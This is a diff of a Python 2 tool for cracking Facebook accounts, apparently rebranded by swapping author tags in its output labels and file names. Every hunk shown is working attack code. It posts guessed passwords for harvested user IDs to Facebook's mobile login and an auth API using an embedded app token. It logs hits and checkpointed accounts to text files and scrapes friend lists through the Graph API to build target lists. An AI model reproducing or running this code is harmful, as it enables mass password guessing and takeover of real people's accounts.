@@ -2305,15 +2305,15 @@ def xoknp():
             p = rana.get('https://mbasic.facebook.com')
             b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
             if 'c_user' in rana.cookies.get_dict().keys():
-                print "\x1b[1;92m[UNKNOWN-OK] "+uid + " | " + pass1
-                ok=open('UNKNOWN-OK.txt', 'a')
+                print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass1
+                ok=open('PSYCHO-OK.txt', 'a')
                 ok.write(uid+ " | " +pass1+ "\n")
                 ok.close()
                 oks.append(uid+pass1)
             else:
                 if 'checkpoint' in rana.cookies.get_dict().keys():
-                    print "\x1b[1;91m[UNKNOWN-CP] "+uid + " | " + pass1
-                    cp=open('UNKNOWN-CP.txt', 'a')
+                    print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass1
+                    cp=open('PICCHI-CP.txt', 'a')
                     cp.write(uid+ " | " +pass1+ "\n")
                     cp.close()
                     cps.append(uid+pass1)
@@ -2324,15 +2324,15 @@ def xoknp():
                     p = rana.get('https://mbasic.facebook.com')
                     b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                     if 'c_user' in rana.cookies.get_dict().keys():
-                        print "\x1b[1;92m[UNKNOWN-OK] "+uid + " | " + pass2
-                        ok=open('UNKNOWN-OK.txt', 'a')
+                        print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass2
+                        ok=open('PSYCHO-OK.txt', 'a')
                         ok.write(uid+ " | " +pass2+ "\n")
                         ok.close()
                         oks.append(uid+pass2)
                     else:
                         if 'checkpoint' in rana.cookies.get_dict().keys():
-                            print "\x1b[1;91m[UNKNOWN-CP] "+uid + " | " + pass2
-                            cp=open('UNKNOWN-CP.txt', 'a')
+                            print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass2
+                            cp=open('PICCHI-CP.txt', 'a')
                             cp.write(uid+ " | " +pass2+ "\n")
                             cp.close()
                             cps.append(uid+pass2)
@@ -2343,15 +2343,15 @@ def xoknp():
                             p = rana.get('https://mbasic.facebook.com')
                             b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                             if 'c_user' in rana.cookies.get_dict().keys():
-                                print "\x1b[1;92m[UNKNOWN-OK] "+uid + " | " + pass3
-                                ok=open('UNKNOWN-OK.txt', 'a')
+                                print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass3
+                                ok=open('PSYCHO-OK.txt', 'a')
                                 ok.write(uid+ " | " +pass3+ "\n")
                                 ok.close()
                                 oks.append(uid+pass3)
                             else:
                                 if 'checkpoint' in rana.cookies.get_dict().keys():
-                                    print "\x1b[1;91m[UNKNOWN-CP] "+uid + " | " + pass3
-                                    cp=open('UNKNOWN-CP.txt', 'a')
+                                    print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass3
+                                    cp=open('PICCHI-CP.txt', 'a')
                                     cp.write(uid+ " | " +pass3+ "\n")
                                     cp.close()
                                     cps.append(uid+pass3)
@@ -2362,15 +2362,15 @@ def xoknp():
                                     p = rana.get('https://mbasic.facebook.com')
                                     b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                     if 'c_user' in rana.cookies.get_dict().keys():
-                                        print "\x1b[1;92m[UNKNOWN-OK] "+uid + " | " + pass4
-                                        ok=open('UNKNOWN-OK.txt', 'a')
+                                        print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass4
+                                        ok=open('PSYCHO-OK.txt', 'a')
                                         ok.write(uid+ " | " +pass4+ "\n")
                                         ok.close()
                                         oks.append(uid+pass4)
                                     else:
                                         if 'checkpoint' in rana.cookies.get_dict().keys():
-                                            print "\x1b[1;91m[UNKNOWN-CP] "+uid + " | " + pass4
-                                            cp=open('UNKNOWN-CP.txt', 'a')
+                                            print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass4
+                                            cp=open('PICCHI-CP.txt', 'a')
                                             cp.write(uid+ " | " +pass4+ "\n")
                                             cp.close()
                                             cps.append(uid+pass4)
@@ -2381,15 +2381,15 @@ def xoknp():
                                             p = rana.get('https://mbasic.facebook.com')
                                             b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                             if 'c_user' in rana.cookies.get_dict().keys():
-                                                print "\x1b[1;92m[UNKNOWN-OK] "+uid + " | " + pass5
-                                                ok=open('UNKNOWN-OK.txt', 'a')
+                                                print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass5
+                                                ok=open('PSYCHO-OK.txt', 'a')
                                                 ok.write(uid+ " | " +pass5+ "\n")
                                                 ok.close()
                                                 oks.append(uid+pass5)
                                             else:
                                                 if 'checkpoint' in rana.cookies.get_dict().keys():
-                                                    print "\x1b[1;91m[UNKNOWN-CP] "+uid + " | " + pass5
-                                                    cp=open('UNKNOWN-CP.txt', 'a')
+                                                    print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass5
+                                                    cp=open('PICCHI-CP.txt', 'a')
                                                     cp.write(uid+ " | " +pass5+ "\n")
                                                     cp.close()
                                                     cps.append(uid+pass5)
@@ -2557,10 +2557,10 @@ def n_p_pass():
         
          
     print "[!] total ids : "+str(len(idx))
-    os.system('echo " -----------------------------------"| lolcat')
-    print "        Cracking Start Please Wait .. "
+    os.system('echo " --------------------------------------------"| lolcat')
+    print "        Cracking Start Please Wait ... "
     print " Agar Idz Nhi Aa Rahe To (Airplane) Flight Mod Use Kro"
-    os.system('echo " -----------------------------------"| lolcat')
+    os.system('echo " --------------------------------------------"| lolcat')
     def main(arg):
         user=arg
         uid, name = user.split("|")
@@ -2573,17 +2573,17 @@ def n_p_pass():
             data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
             q = json.loads(data)
             if "access_token" in q:
-                print "\x1b[1;92m[UNKNOWN-OK] "+uid + " | " + pass1
+                print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass1
                 
-                ok=open('UNKNOWN-OK.txt', 'a')
+                ok=open('PSYCHO-OK.txt', 'a')
                 ok.write(uid+ " | " +pass1+ "\n")
                 ok.close()
                 oks.append(uid+pass1)
                 
             else:
                 if "www.facebook.com" in q ["error_msg"]:
-                    print "\x1b[1;91m[UNKNOWN-CP] "+uid + " | " + pass1
-                    cp=open('UNKNOWN-CP.txt', 'a')
+                    print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass1
+                    cp=open('PICCHI-CP.txt', 'a')
                     cp.write(uid+ " | " +pass1+ "\n")
                     cp.close()
                     cps.append(uid+pass1)
@@ -2592,15 +2592,15 @@ def n_p_pass():
                     data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                     q = json.loads(data)
                     if "access_token" in q:
-                        print "\x1b[1;92m[UNKNOWN-OK] "+uid + " | " + pass2
-                        ok=open('UNKNOWN-OK.txt', 'a')
+                        print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass2
+                        ok=open('PSYCHO-OK.txt', 'a')
                         ok.write(uid+ " | " +pass2+ "\n")
                         ok.close()
                         oks.append(uid+pass2)
                     else:
                         if "www.facebook.com" in q ["error_msg"]:
-                            print "\x1b[1;91m[UNKNOWN-CP] "+uid + " | " + pass2
-                            cp=open('UNKNOWN-CP.txt', 'a')
+                            print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass2
+                            cp=open('PICCHI-CP.txt', 'a')
                             cp.write(uid+ " | " +pass2+ "\n")
                             cp.close()
                             cps.append(uid+pass2)
@@ -2609,15 +2609,15 @@ def n_p_pass():
                             data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                             q = json.loads(data)
                             if "access_token" in q:
-                                print "\x1b[1;92m[ZEESHAN-OK] "+uid + " | " + pass3
-                                ok=open('ZEESHAN-OK.txt', 'a')
+                                print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass3
+                                ok=open('PSYCHO-OK.txt', 'a')
                                 ok.write(uid+ " | " +pass3+ "\n")
                                 ok.close()
                                 oks.append(uid+pass3)
                             else:
                                 if "www.facebook.com" in q ["error_msg"]:
-                                    print "\x1b[1;91m[UNKNOWN-CP] "+uid + " | " + pass3
-                                    cp=open('UNKNOWN-CP.txt', 'a')
+                                    print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass3
+                                    cp=open('PICCHI-CP.txt', 'a')
                                     cp.write(uid+ " | " +pass3+ "\n")
                                     cp.close()
                                     cps.append(uid+pass3)
@@ -2626,15 +2626,15 @@ def n_p_pass():
                                     data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                                     q = json.loads(data)
                                     if "access_token" in q:
-                                        print "\x1b[1;92m[UNKNOWN-OK] "+uid + " | " + pass4
-                                        ok=open('UNKNOWN-OK.txt', 'a')
+                                        print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass4
+                                        ok=open('PSYCHO-OK.txt', 'a')
                                         ok.write(uid+ " | " +pass4+ "\n")
                                         ok.close()
                                         oks.append(uid+pass4)
                                     else:
                                         if "www.facebook.com" in q ["error_msg"]:
-                                            print "\x1b[1;91m[UNKNOWN-CP] "+uid + " | " + pass4
-                                            cp=open('UNKNOWN-CP.txt', 'a')
+                                            print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass4
+                                            cp=open('PICCHI-CP.txt', 'a')
                                             cp.write(uid+ " | " +pass4+ "\n")
                                             cp.close()
                                             cps.append(uid+pass4)
@@ -2643,15 +2643,15 @@ def n_p_pass():
                                             data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                                             q = json.loads(data)
                                             if "access_token" in q:
-                                                print "\x1b[1;92m[UNKNOWN-OK] "+uid + " | " + pass5
-                                                ok=open('UNKNOWN-OK.txt', 'a')
+                                                print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass5
+                                                ok=open('PSYCHO-OK.txt', 'a')
                                                 ok.write(uid+ " | " +pass5+ "\n")
                                                 ok.close()
                                                 oks.append(uid+pass5)
                                             else:
                                                 if "www.facebook.com" in q ["error_msg"]:
-                                                    print "\x1b[1;91m[UNKNOWN-CP] "+uid + " | " + pass5
-                                                    cp=open('UNKNWON-CP.txt', 'a')
+                                                    print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass5
+                                                    cp=open('PICCHI-CP.txt', 'a')
                                                     cp.write(uid+ " | " +pass5+ "\n")
                                                     cp.close()
                                                     cps.append(uid+pass5)
@@ -2799,10 +2799,10 @@ def p_p_pass():
         idx.append(uid + '|' + na)
     
     print "[!] total ids : "+str(len(idx))
-    os.system('echo " -----------------------------------"| lolcat')
-    print "   Cracking Start Please Wait .."
+    os.system('echo " -------------------------------------"| lolcat')
+    print "   Cracking Start Please Wait ..."
     print "  Use Flight Mode For Speed Up"
-    os.system('echo " -----------------------------------"| lolcat')
+    os.system('echo " -------------------------------------"| lolcat')
     def main(arg):
         user=arg
         uid, name = user.split("|")
@@ -2812,17 +2812,17 @@ def p_p_pass():
             data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
             q = json.loads(data)
             if "access_token" in q:
-                print "\x1b[1;92m[ZEESHAN-OK] "+uid + " | " + pass1
+                print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass1
                 
-                ok=open('ZEESHAN-OK.txt', 'a')
+                ok=open('PSYCHO-OK.txt', 'a')
                 ok.write(uid+ " | " +pass1+ "\n")
                 ok.close()
                 oks.append(uid+pass1)
                 
             else:
                 if "www.facebook.com" in q ["error_msg"]:
-                    print "\x1b[1;91m[ZEESHAN-CP] "+uid + " | " + pass1
-                    cp=open('IMTIWZ-cp.txt', 'a')
+                    print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass1
+                    cp=open('PICCHI-cp.txt', 'a')
                     cp.write(uid+ " | " +pass1+ "\n")
                     cp.close()
                     cps.append(uid+pass1)
@@ -2831,15 +2831,15 @@ def p_p_pass():
                     data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                     q = json.loads(data)
                     if "access_token" in q:
-                        print "\x1b[1;92m[ZEESHAN-OK] "+uid + " | " + pass2
-                        ok=open('ZEESHAN-OK.txt', 'a')
+                        print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass2
+                        ok=open('PSYCHO-OK.txt', 'a')
                         ok.write(uid+ " | " +pass2+ "\n")
                         ok.close()
                         oks.append(uid+pass2)
                     else:
                         if "www.facebook.com" in q ["error_msg"]:
-                            print "\x1b[1;91m[ZEESHAN-CP] "+uid + " | " + pass2
-                            cp=open('ZEESHAN-CP.txt', 'a')
+                            print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass2
+                            cp=open('PICCHI-CP.txt', 'a')
                             cp.write(uid+ " | " +pass2+ "\n")
                             cp.close()
                             cps.append(uid+pass2)
@@ -2848,15 +2848,15 @@ def p_p_pass():
                             data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                             q = json.loads(data)
                             if "access_token" in q:
-                                print "\x1b[1;92m[ZEESHAN-OK] "+uid + " | " + pass3
-                                ok=open('ZEESHAN-OK.txt', 'a')
+                                print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass3
+                                ok=open('PSYCHO-OK.txt', 'a')
                                 ok.write(uid+ " | " +pass3+ "\n")
                                 ok.close()
                                 oks.append(uid+pass3)
                             else:
                                 if "www.facebook.com" in q ["error_msg"]:
-                                    print "\x1b[1;91m[ZEESHAN-CP] "+uid + " | " + pass3
-                                    cp=open('ZEESHAN-CP.txt', 'a')
+                                    print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass3
+                                    cp=open('PICCHI-CP.txt', 'a')
                                     cp.write(uid+ " | " +pass3+ "\n")
                                     cp.close()
                                     cps.append(uid+pass3)
@@ -2865,15 +2865,15 @@ def p_p_pass():
                                     data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                                     q = json.loads(data)
                                     if "access_token" in q:
-                                        print "\x1b[1;92m[ZEESHAN-OK] "+uid + " | " + pass4
-                                        ok=open('ZEESHAN-OK.txt', 'a')
+                                        print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass4
+                                        ok=open('PSYCHO-OK.txt', 'a')
                                         ok.write(uid+ " | " +pass4+ "\n")
                                         ok.close()
                                         oks.append(uid+pass4)
                                     else:
                                         if "www.facebook.com" in q ["error_msg"]:
-                                            print "\x1b[1;91m[ZEESHAN-CP] "+uid + " | " + pass4
-                                            cp=open('ZEESHAN-CP.txt', 'a')
+                                            print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass4
+                                            cp=open('PICCHI-CP.txt', 'a')
                                             cp.write(uid+ " | " +pass4+ "\n")
                                             cp.close()
                                             cps.append(uid+pass4)
@@ -3027,7 +3027,7 @@ def mineExt():
     file=open('kk.txt')
     my_line = file.readline()
     count.append(my_line)
-    print g+"[*] Extracting From IMTIAZ : "+my_line[:15]
+    print g+"[*] Extracting From PSYCHO : "+my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -3039,7 +3039,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g+"[*] Extracting From IMTIAZ : "+my_line[:15]
+    print g+"[*] Extracting From PSYCHO : "+my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -3051,7 +3051,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g+"[*] Extracting From IMTIAZ : "+my_line[:15]
+    print g+"[*] Extracting From PSYCHO : "+my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -3063,7 +3063,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g+"[*] Extracting From IMTIAZ : "+my_line[:15]
+    print g+"[*] Extracting From PSYCHO : "+my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -3075,7 +3075,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g+"[*] Extracting From IMTIAZ : "+my_line[:15]
+    print g+"[*] Extracting From PSYCHO : "+my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -3087,7 +3087,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g+"[*] Extracting From IMTIAZ : "+my_line[:15]
+    print g+"[*] Extracting From PSYCHO : "+my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -3099,7 +3099,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g+"[*] Extracting From IMTIAZ : "+my_line[:15]
+    print g+"[*] Extracting From PSYCHO : "+my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -3111,7 +3111,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g+"[*] Extracting From IMTIAZ : "+my_line[:15]
+    print g+"[*] Extracting From PSYCHO : "+my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -3123,7 +3123,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g+"[*] Extracting From IMTIAZ : "+my_line[:15]
+    print g+"[*] Extracting From PSYCHO : "+my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -3135,7 +3135,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g+"[*] Extracting From IMTIAZ : "+my_line[:15]
+    print g+"[*] Extracting From PSYCHO : "+my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -3147,7 +3147,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g+"[*] Extracting From IMTIAZ : "+my_line[:15]
+    print g+"[*] Extracting From PSYCHO : "+my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -3159,7 +3159,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g+"[=] Extracting From IMTIAZ : "+my_line[:15]
+    print g+"[=] Extracting From PSYCHO : "+my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -3171,7 +3171,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g+"[*] Extracting From IMTIAZ : "+my_line[:15]
+    print g+"[*] Extracting From PSYCHO : "+my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -3183,7 +3183,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g+"[*] Extracting From IMTIAZ : "+my_line[:15]
+    print g+"[*] Extracting From PSYCHO : "+my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -3195,7 +3195,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g+"[*] Extracting From IMTIAZ : "+my_line[:15]
+    print g+"[*] Extracting From PSYCHO : "+my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -3207,7 +3207,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g+"[*] Extracting From IMTIAZ : "+my_line[:15]
+    print g+"[*] Extracting From PSYCHO : "+my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -3219,7 +3219,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g+"[*] Extracting From IMTIAZ : "+my_line[:15]
+    print g+"[*] Extracting From PSYCHO : "+my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -3231,7 +3231,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g+"[*] Extracting From IMTIAZ : "+my_line[:15]
+    print g+"[*] Extracting From PSYCHO : "+my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -3243,7 +3243,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g+"[*] Extracting From IMTIAZ : "+my_line[:15]
+    print g+"[*] Extracting From PSYCHO : "+my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -3255,7 +3255,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g+"[*] Extracting From IMTIAZ : "+my_line[:15]
+    print g+"[*] Extracting From PSYCHO : "+my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -4026,15 +4026,15 @@ def fileauto():
             p = rana.get('https://mbasic.facebook.com')
             b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
             if 'c_user' in rana.cookies.get_dict().keys():
-                print "\x1b[1;92m[ZEESHAN-OK] "+uid + " | " + pass1
-                ok=open('ZEESHAN-OK.txt', 'a')
+                print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass1
+                ok=open('PSYCHO-OK.txt', 'a')
                 ok.write(uid+ " | " +pass1+ "\n")
                 ok.close()
                 oks.append(uid+pass1)
             else:
                 if 'checkpoint' in rana.cookies.get_dict().keys():
-                    print "\x1b[1;91m[ZEESHAN-CP] "+uid + " | " + pass1
-                    cp=open('ZEESHAN-CP.txt', 'a')
+                    print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass1
+                    cp=open('PICCHI-CP.txt', 'a')
                     cp.write(uid+ " | " +pass1+ "\n")
                     cp.close()
                     cps.append(uid+pass1)
@@ -4045,15 +4045,15 @@ def fileauto():
                     p = rana.get('https://mbasic.facebook.com')
                     b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                     if 'c_user' in rana.cookies.get_dict().keys():
-                        print "\x1b[1;92m[ZEESHAN-OK] "+uid + " | " + pass2
-                        ok=open('ZEESHAN-OK.txt', 'a')
+                        print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass2
+                        ok=open('PSYCHO-OK.txt', 'a')
                         ok.write(uid+ " | " +pass2+ "\n")
                         ok.close()
                         oks.append(uid+pass2)
                     else:
                         if 'checkpoint' in rana.cookies.get_dict().keys():
-                            print "\x1b[1;91m[ZEESHAN-CP] "+uid + " | " + pass2
-                            cp=open('ZEESHAN-CP.txt', 'a')
+                            print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass2
+                            cp=open('PICCHI-CP.txt', 'a')
                             cp.write(uid+ " | " +pass2+ "\n")
                             cp.close()
                             cps.append(uid+pass2)
@@ -4064,15 +4064,15 @@ def fileauto():
                             p = rana.get('https://mbasic.facebook.com')
                             b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                             if 'c_user' in rana.cookies.get_dict().keys():
-                                print "\x1b[1;92m[ZEESHAN-OK] "+uid + " | " + pass3
-                                ok=open('ZEESHAN-OK.txt', 'a')
+                                print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass3
+                                ok=open('PSYCHO-OK.txt', 'a')
                                 ok.write(uid+ " | " +pass3+ "\n")
                                 ok.close()
                                 oks.append(uid+pass3)
                             else:
                                 if 'checkpoint' in rana.cookies.get_dict().keys():
-                                    print "\x1b[1;91m[ZEESHAN-CP] "+uid + " | " + pass3
-                                    cp=open('ZEESHAN-CP.txt', 'a')
+                                    print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass3
+                                    cp=open('PICCHI-CP.txt', 'a')
                                     cp.write(uid+ " | " +pass3+ "\n")
                                     cp.close()
                                     cps.append(uid+pass3)
@@ -4083,15 +4083,15 @@ def fileauto():
                                     p = rana.get('https://mbasic.facebook.com')
                                     b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                     if 'c_user' in rana.cookies.get_dict().keys():
-                                        print "\x1b[1;92m[ZEESHAN-OK] "+uid + " | " + pass4
-                                        ok=open('ZEESHAN-OK.txt', 'a')
+                                        print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass4
+                                        ok=open('PSYCHO-OK.txt', 'a')
                                         ok.write(uid+ " | " +pass4+ "\n")
                                         ok.close()
                                         oks.append(uid+pass4)
                                     else:
                                         if 'checkpoint' in rana.cookies.get_dict().keys():
-                                            print "\x1b[1;91m[ZEESHAN-CP] "+uid + " | " + pass4
-                                            cp=open('ZEESHAN-CP.txt', 'a')
+                                            print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass4
+                                            cp=open('PICCHI-CP.txt', 'a')
                                             cp.write(uid+ " | " +pass4+ "\n")
                                             cp.close()
                                             cps.append(uid+pass4)
@@ -4102,15 +4102,15 @@ def fileauto():
                                             p = rana.get('https://mbasic.facebook.com')
                                             b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                             if 'c_user' in rana.cookies.get_dict().keys():
-                                                print "\x1b[1;92m[ZEESHAN-OK] "+uid + " | " + pass5
-                                                ok=open('ZEESHAN-OK.txt', 'a')
+                                                print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass5
+                                                ok=open('PSYCHO-OK.txt', 'a')
                                                 ok.write(uid+ " | " +pass5+ "\n")
                                                 ok.close()
                                                 oks.append(uid+pass5)
                                             else:
                                                 if 'checkpoint' in rana.cookies.get_dict().keys():
-                                                    print "\x1b[1;91m[ZEESHAN-CP] "+uid + " | " + pass5
-                                                    cp=open('ZEESHAN-CP.txt', 'a')
+                                                    print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass5
+                                                    cp=open('PICCHI-CP.txt', 'a')
                                                     cp.write(uid+ " | " +pass5+ "\n")
                                                     cp.close()
                                                     cps.append(uid+pass5)
@@ -4176,7 +4176,7 @@ def n_f_p_pass():
         
